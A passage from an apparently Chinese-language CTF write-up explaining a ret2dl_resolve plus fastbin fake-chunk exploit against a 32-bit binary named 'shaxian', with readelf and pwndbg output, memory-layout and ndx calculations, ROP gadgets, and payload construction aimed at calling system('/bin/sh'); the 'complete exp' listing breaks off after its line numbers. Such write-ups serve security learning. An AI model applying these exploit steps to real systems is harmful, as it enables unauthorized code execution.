class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -V shaxian</span><br><span class="line"></span><br><span class="line">Version symbols section &apos;.gnu.version&apos; contains 17 entries:</span><br><span class="line"> Addr: 0000000008048396  Offset: 0x000396  Link: 5 (.dynsym)</span><br><span class="line">  000:   0 (*local*)       2 (GLIBC_2.0)     2 (GLIBC_2.0)     2 (GLIBC_2.0)  </span><br><span class="line">  004:   2 (GLIBC_2.0)     2 (GLIBC_2.0)     2 (GLIBC_2.0)     3 (GLIBC_2.4)  </span><br><span class="line">  008:   2 (GLIBC_2.0)     2 (GLIBC_2.0)     0 (*local*)       2 (GLIBC_2.0)  </span><br><span class="line">  00c:   2 (GLIBC_2.0)     2 (GLIBC_2.0)     2 (GLIBC_2.0)     1 (*global*)   </span><br><span class="line">  010:   2 (GLIBC_2.0)  </span><br><span class="line"></span><br><span class="line">Version needs section &apos;.gnu.version_r&apos; contains 1 entries:</span><br><span class="line"> Addr: 0x00000000080483b8  Offset: 0x0003b8  Link: 6 (.dynstr)</span><br><span class="line">  000000: Version: 1  File: libc.so.6  Cnt: 2</span><br><span class="line">  0x0010:   Name: GLIBC_2.4  Flags: none  Version: 3</span><br><span class="line">  0x0020:   Name: GLIBC_2.0  Flags: none  Version: 2</span><br><span class="line"></span><br><span class="line">--------------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">$ readelf -V libc-2.23.so </span><br><span class="line"></span><br><span class="line">Version symbols section &apos;.gnu.version&apos; contains 2415 entries:</span><br><span class="line"> Addr: 000000000001345c  Offset: 0x01345c  Link: 4 (.dynsym)</span><br><span class="line">  000:   0 (*local*)      24 (GLIBC_2.1)    25 (GLIBC_PRIVATE)  25 (GLIBC_PRIVATE)</span><br><span class="line">  004:   0 (*local*)      25 (GLIBC_PRIVATE)  25 (GLIBC_PRIVATE)   0 (*local*)    </span><br><span class="line">  008:  26 (GLIBC_2.3)    25 (GLIBC_PRIVATE)   7 (GLIBC_2.2)     4 (GLIBC_2.1.1)</span><br><span class="line">  00c:  11 (GLIBC_2.4)     4 (GLIBC_2.1.1)   2 (GLIBC_2.0)     3 (GLIBC_2.1)  </span><br><span class="line">  010:   4 (GLIBC_2.1.1)   e (GLIBC_2.3.2)   2 (GLIBC_2.0)    11 (GLIBC_2.4)  </span><br><span class="line">  014:   2 (GLIBC_2.0)     3 (GLIBC_2.1)     2 (GLIBC_2.0)     2 (GLIBC_2.0)  </span><br><span class="line">........</span><br><span class="line"></span><br><span class="line">Version definition section &apos;.gnu.version_d&apos; contains 35 entries:</span><br><span class="line">  Addr: 0x000000000001473c  Offset: 0x01473c  Link: 5 (.dynstr)  </span><br><span class="line">  000000: Rev: 1  Flags: BASE   Index: 1  Cnt: 1  Name: libc.so.6</span><br><span class="line">  0x001c: Rev: 1  Flags: none  Index: 2  Cnt: 1  Name: GLIBC_2.0</span><br><span class="line">  0x0038: Rev: 1  Flags: none  Index: 3  Cnt: 2  Name: GLIBC_2.1</span><br><span class="line">  0x0054: Parent 1: GLIBC_2.0</span><br><span class="line">  0x005c: Rev: 1  Flags: none  Index: 4  Cnt: 2  Name: GLIBC_2.1.1</span><br><span class="line">  0x0078: Parent 1: GLIBC_2.1</span><br><span class="line">........</span><br><span class="line">  0x0494: Rev: 1  Flags: none  Index: 34  Cnt: 2  Name: GLIBC_PRIVATE</span><br><span class="line">  0x04b0: Parent 1: GLIBC_2.23</span><br><span class="line">  0x04b8: Rev: 1  Flags: none  Index: 35  Cnt: 1  Name: GCC_3.0</span><br><span class="line">  Version definition past end of section</span><br><span class="line"></span><br><span class="line">Version needs section &apos;.gnu.version_r&apos; contains 1 entries:</span><br><span class="line"> Addr: 0x0000000000014c10  Offset: 0x014c10  Link: 5 (.dynstr)</span><br><span class="line">  000000: Version: 1  File: ld-linux.so.2  Cnt: 3</span><br><span class="line">  0x0010:   Name: GLIBC_2.3  Flags: none  Version: 38</span><br><span class="line">  0x0020:   Name: GLIBC_PRIVATE  Flags: none  Version: 37</span><br><span class="line">  0x0030:   Name: GLIBC_2.1  Flags: none  Version: 36</span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;<code>l-&gt;l_version</code>数组(link_map中的结构)应该是将<code>可执行文件</code>的符号版本信息放在前，<code>libc.so</code>的符号版本信息放在后：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">_dl_fixup()：</span><br><span class="line">0xf7fe785b    add    edx, dword ptr [edi + 0x170] ; edx = l_version[ndx]</span><br><span class="line">► 0xf7fe7861    mov    ecx, dword ptr [edx + 4] ; ecx = 0x0D696910,version-&gt;hash</span><br><span class="line"></span><br><span class="line">pwndbg&gt; dps 0xf7ffd918+0x170</span><br><span class="line">00:0000│   0xf7ffda88 —▸ 0xf7fd3480 ◂— 0x0</span><br><span class="line">01:0004│   0xf7ffda8c ◂— 0x4</span><br><span class="line">02:0008│   0xf7ffda90 ◂— 0x3</span><br><span class="line">03:000c│   0xf7ffda94 ◂— 0x0</span><br><span class="line">04:0010│   0xf7ffda98 ◂— 0x5</span><br><span class="line">05:0014│   0xf7ffda9c —▸ 0x80481bc ◂— sub    byte ptr [ebx], 2</span><br><span class="line">06:0018│   0xf7ffdaa0 —▸ 0x80481c0 ◂— or     eax, 0xe000000 /* &apos;\r&apos; */</span><br><span class="line">07:001c│   0xf7ffdaa4 —▸ 0x8048198 ◂— test   dl, al</span><br><span class="line"></span><br><span class="line">pwndbg&gt; dps 0xf7fd3480 300</span><br><span class="line">00:0000│ edx  0xf7fd3480 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">08:0020│      0xf7fd34a0 —▸ 0x804838c ◂— inc    edi /* &apos;GLIBC_2.0&apos; */</span><br><span class="line">09:0024│      0xf7fd34a4 ◂— 0xd696910</span><br><span class="line">0a:0028│      0xf7fd34a8 ◂— 0x0</span><br><span class="line">0b:002c│      0xf7fd34ac —▸ 0x80482ed ◂— insb   byte ptr es:[edi], dx /* &apos;libc.so.6&apos; */</span><br><span class="line">0c:0030│      0xf7fd34b0 —▸ 0x8048382 ◂— inc    edi /* &apos;GLIBC_2.4&apos; */</span><br><span class="line">0d:0034│      0xf7fd34b4 ◂— 0xd696914</span><br><span class="line">0e:0038│      0xf7fd34b8 ◂— 0x0</span><br><span class="line">0f:003c│      0xf7fd34bc —▸ 0x80482ed ◂— insb   byte ptr es:[edi], dx /* &apos;libc.so.6&apos; */</span><br><span class="line">10:0040│      0xf7fd34c0 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">18:0060│      0xf7fd34e0 —▸ 0xf7fd7241 ◂— dec    esp /* &apos;LINUX_2.6&apos; */</span><br><span class="line">19:0064│      0xf7fd34e4 ◂— 0x3ae75f6</span><br><span class="line">1a:0068│      0xf7fd34e8 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">1c:0070│      0xf7fd34f0 —▸ 0xf7fd724b ◂— dec    esp /* &apos;LINUX_2.5&apos; */</span><br><span class="line">1d:0074│      0xf7fd34f4 ◂— 0x3ae75f5</span><br><span class="line">1e:0078│      0xf7fd34f8 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">28:00a0│      0xf7fd3520 —▸ 0xf7e0d2e5 ◂— inc    edi /* &apos;GLIBC_2.0&apos; */</span><br><span class="line">29:00a4│      0xf7fd3524 ◂— 0xd696910</span><br><span class="line">2a:00a8│      0xf7fd3528 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">2c:00b0│      0xf7fd3530 —▸ 0xf7e0d2ef ◂— inc    edi /* &apos;GLIBC_2.1&apos; */</span><br><span class="line">2d:00b4│      0xf7fd3534 ◂— 0xd696911</span><br><span class="line">2e:00b8│      0xf7fd3538 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">30:00c0│      0xf7fd3540 —▸ 0xf7e0d2f9 ◂— inc    edi /* &apos;GLIBC_2.1.1&apos; */</span><br><span class="line">31:00c4│      0xf7fd3544 ◂— 0x9691f71</span><br><span class="line">32:00c8│      0xf7fd3548 ◂— 0x0</span><br><span class="line">.......</span><br></pre></td></tr></table></figure></p>
<h4 id="0x31-内存的布局"><a href="#0x31-内存的布局" class="headerlink" title="0x31 内存的布局"></a>0x31 内存的布局</h4><p>1、<code>shellcode</code>之前应该<code>预留的</code>栈空间大小</p>
<p>&emsp;&emsp;这里的shellcode指的是如下形式的：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shellcode = p32(PLT0) + p32(reloc_offset) + p32(0x01010101) + p32(binsh_str_addr)</span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;这段shellcode的功能是使程序的控制流跳转到<code>PLT0</code>，执行符号地址解析函数<code>_dl_runtime_resolve()</code>。<code>第一个双字</code>是PLT0的地址，<code>第二个双字</code>是符号的重定位项在重定位表中的偏移，<code>第三个双字</code>是所解析函数的返回地址，<code>第四个双字</code>是所解析函数的参数。</p>
<p>&emsp;&emsp;由于此程序开启了<code>Partial RELRO</code>(部分重定位只读)，所以<code>.dynamic段</code>是不可写的，<code>.got.plt段</code>(GOT表)是可写的。程序控制流跳转到shellcode后，<code>栈</code>也跟着<code>转移</code>过来了。符号解析函数在<code>解析符号地址</code>的过程中会<code>读写</code>shellcode之前的地址上的数据。由于只有.got.plt段以后才可写，所以我们的<code>shellcode</code>应该距离<code>.got.plt段起始地址</code>有一段距离。经过测试，这个距离至少为<code>0x300字节</code>。这个值或许与<code>glibc</code>的版本有关，但影响应该不大。所以，我们的shellcode应至少在Title的缓冲区中或之后。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line"> 0x8048000  0x804a000 r-xp     2000 0      /home/buffer/Desktop/remote-dbg/shaxian</span><br><span class="line"> 0x804a000  0x804b000 r--p     1000 1000   /home/buffer/Desktop/remote-dbg/shaxian</span><br><span class="line"> 0x804b000  0x804c000 rw-p     1000 2000   /home/buffer/Desktop/remote-dbg/shaxian</span><br><span class="line"> 0x804c000  0x806d000 rw-p    21000 0      [heap]</span><br><span class="line">0xf7df9000 0xf7dfa000 rw-p     1000 0      </span><br><span class="line">0xf7dfa000 0xf7faa000 r-xp   1b0000 0      /lib/i386-linux-gnu/libc-2.23.so</span><br><span class="line">0xf7faa000 0xf7fab000 ---p     1000 1b0000 /lib/i386-linux-gnu/libc-2.23.so</span><br><span class="line">0xf7fab000 0xf7fad000 r--p     2000 1b0000 /lib/i386-linux-gnu/libc-2.23.so</span><br><span class="line">0xf7fad000 0xf7fae000 rw-p     1000 1b2000 /lib/i386-linux-gnu/libc-2.23.so</span><br><span class="line">0xf7fae000 0xf7fb1000 rw-p     3000 0      </span><br><span class="line">0xf7fd3000 0xf7fd4000 rw-p     1000 0      </span><br><span class="line">0xf7fd4000 0xf7fd7000 r--p     3000 0      [vvar]</span><br><span class="line">0xf7fd7000 0xf7fd9000 r-xp     2000 0      [vdso]</span><br><span class="line">0xf7fd9000 0xf7ffc000 r-xp    23000 0      /lib/i386-linux-gnu/ld-2.23.so</span><br><span class="line">0xf7ffc000 0xf7ffd000 r--p     1000 22000  /lib/i386-linux-gnu/ld-2.23.so</span><br><span class="line">0xf7ffd000 0xf7ffe000 rw-p     1000 23000  /lib/i386-linux-gnu/ld-2.23.so</span><br><span class="line">0xfffdd000 0xffffe000 rw-p    21000 0      [stack]</span><br><span class="line"></span><br><span class="line">1、.got.plt段的起始地址为0x804b000。</span><br><span class="line">2、此程序中现有的缓冲区：</span><br><span class="line">    # 0x0804B0C0 - 0x0804B1C0 (0x100)</span><br><span class="line">    Phone_number_buf = 0x0804B0C0</span><br><span class="line">    # 0x0804B1C0 - 0x0804B1E0 (0x20)</span><br><span class="line">    head_ptr = 0x0804B1C0</span><br><span class="line">    # 0x0804B1E0 - 0x0804B2E0 (0x100)</span><br><span class="line">    Address_buf = 0x0804B1E0</span><br><span class="line">    # 0x0804B2E0 - 0x0804B300 (0x20)</span><br><span class="line">    shopping_cart = 0x0804B2E0</span><br><span class="line">    # 0x0804B300 - 0x0804B400 (0x100)</span><br><span class="line">    Title = 0x0804B300</span><br></pre></td></tr></table></figure></p>
<p>2、<code>shellcode</code>与<code>fake_chain</code>的位置关系</p>
<p>&emsp;&emsp;<code>shellcode</code>一般在<code>fake_chain</code>的前面，这样就不会出现符号解析函数解析过程中将fake_chain数据<code>覆盖</code>的情况。就算一定要放在后面，也要与fake_chain有一个<code>安全距离</code>。</p>
<p>3、<code>ndx</code>的取值</p>
<p>&emsp;&emsp;<code>ndx值</code>一般设为<code>0</code>即可，设为别的值也可，不过要满足一定的条件。如果将fake_chain放入<code>phone_number</code>、<code>address</code>、<code>title</code>等缓冲区中，计算是否存在可用的ndx值：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">计算方法：</span><br><span class="line">sym_data_addr(0x0804BF1C) = DT_SYMTAB(0x080481DC) + sym_index(0x3D4) * 16   (not useful)</span><br><span class="line">versym_data_addr(0x08048B3E) = DT_VERSYM(0x08048396) + sym_index(0x3D4) * 2</span><br><span class="line"></span><br><span class="line">--------------------------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">计算内存布局(大概计算，未对齐)</span><br><span class="line">Phone_number_buf  0x0804B0C0 - 0x0804B1C0</span><br><span class="line">sym_index  0x2EE - 0x2FE</span><br><span class="line">versym_data_addr  0x08048972 - 0x08048992(ndx值地址范围)</span><br><span class="line"></span><br><span class="line">Address_buf  0x0804B1E0 - 0x0804B2E0</span><br><span class="line">sym_index  0x300 - 0x310</span><br><span class="line">versym_data_addr  0x08048996 - 0x080489B6(ndx值地址范围)</span><br><span class="line"></span><br><span class="line">Title  0x0804B300 - 0x0804B400</span><br><span class="line">sym_index  0x312 - 0x322</span><br><span class="line">versym_data_addr  0x080489BA - 0x080489DA(ndx值地址范围)</span><br><span class="line"></span><br><span class="line">--------------------------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">l_version = 0xf7fd3480</span><br><span class="line">r_found_version *version = l-&gt;l_version[ndx] = l-&gt;l_version + ndx*0x10</span><br><span class="line"></span><br><span class="line">1、0xf7fd3000 0xf7fd4000 rw-p     1000 0 (libc-2.23.so数据段); 0 &lt;= ndx &lt;= 0xB7(只有一个合适的)</span><br><span class="line">0x080489A2    ndx = 0x8B &lt; 0xB7(hash = 0)</span><br><span class="line">sym_index = 0x306</span><br><span class="line">(因为fake_chain在Address_buf,shellcode没法放在它的前面,要留够一定栈空间,执行后面的解析函数地址程序,放在后面,解析函数地址过程中,会覆盖fake_chain,如果之间的距离大于等于0x300,则应该可以)</span><br><span class="line"></span><br><span class="line">2、0xf7fd4000 0xf7fd7000 r--p     3000 0      [vvar] ; 0xB8 &lt; ndx &lt; 0x3B8 (此段虽然可读，但是成功率比较低，也无法查看其中的数据)</span><br><span class="line">0x0804897E    ndx = 0x1C0 &lt; 0x3B8</span><br><span class="line">sym_index = 0x2F4(未成功,收到SIGBUS, Bus error信号)</span><br><span class="line">0x08048A00    ndx = 0xF0 &lt; 0x3B8</span><br><span class="line">sym_index = 0x335(成功,这个fake_chain不在现有缓冲区中,在Title后面的fake_chunk中)</span><br><span class="line"></span><br><span class="line">3、0xf7ffc000 0xf7ffd000 r--p     1000 22000  /lib/i386-linux-gnu/ld-2.23.so；0x28B8 &lt; ndx &lt; 0x29B8(只有一个合适的)</span><br><span class="line">0xf7ffc210 - 0xf7fd3480 = 0x28D90</span><br><span class="line">0x080489C4    ndx = 0x28EC &lt; 0x29B8</span><br><span class="line">sym_index = 0x317(成功)</span><br><span class="line"></span><br><span class="line">4、0xf7ffd000 0xf7ffe000 rw-p     1000 23000  /lib/i386-linux-gnu/ld-2.23.so; 0x29B8 &lt; ndx &lt; 0x2AB8(未找到合适的)</span><br><span class="line"></span><br><span class="line">如果将fake_chain放入Title缓冲区后面构造的fake_chunk中，需要满足以下条件：</span><br><span class="line">- 1、由上可知，fake_chain要放在Title之后，sym_index至少为0x322,但是fake_sym数据的地址不能超过0x804C000,所以sym_index至多为0x3E2。</span><br><span class="line">- 2、versym_data在0x080489DA之后，但不能超过0x08048B5A。在这期间找是否有符合以上ndx范围的ndx值。</span><br></pre></td></tr></table></figure></p>
<p>4、<code>version-&gt;Hash</code>的取值</p>
<p>&emsp;&emsp;<code>ndx值</code>如果<code>未使</code>l_version数组访问越界，则对<code>version-&gt;hash</code>的值无要求。<code>ndx值</code>如果<code>使</code>l_version数组访问越界，则要使<code>version-&gt;hash</code>的值为0。</p>
<h4 id="0x32-本方法使用的内存布局"><a href="#0x32-本方法使用的内存布局" class="headerlink" title="0x32 本方法使用的内存布局"></a>0x32 本方法使用的内存布局</h4><p>&emsp;&emsp;fake_chunk的地址应该<code>8字节对齐</code>，而<code>sym_data地址</code>与<code>符号表(.dynsym)</code>起始地址的差值应该是<code>0x10</code>的整数倍，fake_chunk的<code>内存布局</code>如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[fake_chunk] for [fake_chain]</span><br><span class="line">0x0804BF08 - 0x0804BF10  chunk_header</span><br><span class="line">0x0804BF10 - 0x0804BF14  count</span><br><span class="line">0x0804BF14 - 0x0804BF34  food_type</span><br><span class="line">0x0804BF34 - 0x0804BF38  next</span><br><span class="line"></span><br><span class="line">[fake_chain]</span><br><span class="line">0x0804BF14 - 0x0804BF1C  reloc_data</span><br><span class="line">0x0804BF1C - 0x0804BF2C  sym_data</span><br><span class="line">0x0804BF2C - 0x0804BF34  &quot;system&quot;</span><br><span class="line">0x0804BF34 - 0x0804BF3C  &quot;/bin/sh&quot;</span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;还有一个处于<code>head_ptr附近</code>的用于<code>任意地址</code>写入4字节<code>任意数据</code>的fake_chunk，此fake_chunk的<code>内存布局</code>如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">0x0804B0C0 - 0x0804B1C0  Phone_number </span><br><span class="line"></span><br><span class="line">[fake_chunk] for head_ptr</span><br><span class="line">0x0804B1B0 - 0x0804B1B8  chunk_header</span><br><span class="line">0x0804B1B8 - 0x0804B1BC  count</span><br><span class="line">0x0804B1BC - 0x0804B1C0------------</span><br><span class="line">0x0804B1C0 - 0x0804B1C4  head_ptr |food_type</span><br><span class="line">0x0804B1C4 - 0x0804B1DC------------	</span><br><span class="line">0x0804B1DC - 0x0804B1E0  next</span><br><span class="line"></span><br><span class="line">0x0804B1E0 - 0x0804B1E8  Address(next_chunk&apos;s chunk_header)</span><br><span class="line">0x0804B1E8 - 0x0804B2E0  Address</span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;我们将<code>shellcode</code>放在了Title缓冲区的<code>末尾</code>，在fake_chain的<code>前面</code>，保证了预留的栈空间大于<code>0x300字节</code>。至此，内存布局完成。</p>
<h4 id="0x33-利用思路"><a href="#0x33-利用思路" class="headerlink" title="0x33 利用思路"></a>0x33 利用思路</h4><p>1、<strong><code>Stage1</code></strong>：为fake_chain创建fake_chunk</p>
<p>&emsp;&emsp;为<code>fake_chain</code>创建<code>fake_chunk</code>其实就是伪造fake_chunk的chunk_header和fake_chunk的next_chunk的chunk_header。因为需要<code>Free</code>的<code>chunk</code>是需要满足一定条件的：</p>
<blockquote>
<p>1、fake_chunk 的<code>ISMMAP</code>位不能为1，因为 free 时，如果是 mmap 的 chunk，会单独处理。<br>2、fake_chunk 地址需要对齐， <code>MALLOC_ALIGN_MASK</code>。<br>3、fake_chunk 的<code>size大小</code>需要满足对应的fastbin的需求，同时也得<code>对齐</code>。<br>4、fake_chunk的<code>next chunk的大小</code>不能小于2 * SIZE_SZ，同时也不能大于av-&gt;system_mem 。<br>5、fake_chunk对应的<code>fastbin链表头部</code>不能是该fake_chunk，即不能构成<code>double free</code>的情况。</p>
</blockquote>
<p>2、<strong><code>Stage2</code></strong>：将fake_chain写入fake_chunk</p>
<p>&emsp;&emsp;首先将<code>fake_chunk</code>释放，让其进入<code>fastbin链表</code>中，<code>fastbin链表的头指针</code>指向这个fake_chunk，下次通过<code>malloc</code>申请chunk时，就会从fastbin链表的头部取下这个fake_chunk，我们就可以将<code>fake_chain</code>写入到此<code>fake_chunk</code>。</p>
<p>3、<strong><code>Stage3</code></strong>：将shellcode写入Title缓冲区末尾</p>
<p>&emsp;&emsp;shellcode用于<code>调用符号解析函数</code>，解析system的地址。</p>
<p>4、<strong><code>Stage4</code></strong>：将atoi_got修改为gadgets的地址</p>
<p>&emsp;&emsp;gadgets的作用是<code>抬高栈</code>，因为<code>调用atoi()函数</code>的时候，<code>esp</code>距离<code>payload</code>还有一段内存，所以需要将栈抬高。还将<code>ebp</code>修改为<code>shellcode的地址</code>，再通过<code>leave;ret</code>跳转到shellcode执行。<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">08048C29  <span class="keyword">add</span> <span class="built_in">esp</span>, <span class="number">1Ch</span></span><br><span class="line">08048C2C  <span class="keyword">pop</span> <span class="built_in">ebx</span></span><br><span class="line">08048C2D  <span class="keyword">pop</span> <span class="built_in">esi</span></span><br><span class="line">08048C2E  <span class="keyword">pop</span> <span class="built_in">edi</span></span><br><span class="line">08048C2F  <span class="keyword">pop</span> <span class="built_in">ebp</span></span><br><span class="line">08048C30  <span class="keyword">retn</span></span><br></pre></td></tr></table></figure></p>
<p>5、<strong><code>Stage5</code></strong>：输入atoi的参数,并跳转到shellcode执行<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># esi,edi,ebp,ret(将ebp修改为shellcode地址,通过ebp和leave_ret调整esp,跳转到shellcode执行)</span></span><br><span class="line">payload = <span class="string">'A'</span>*<span class="number">8</span> + p32(Title + <span class="number">0x100</span> - <span class="number">0x10</span> - <span class="number">0x14</span>) + p32(leave_ret)</span><br></pre></td></tr></table></figure></p>
<p><strong><code>完整exp</code></strong>：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span 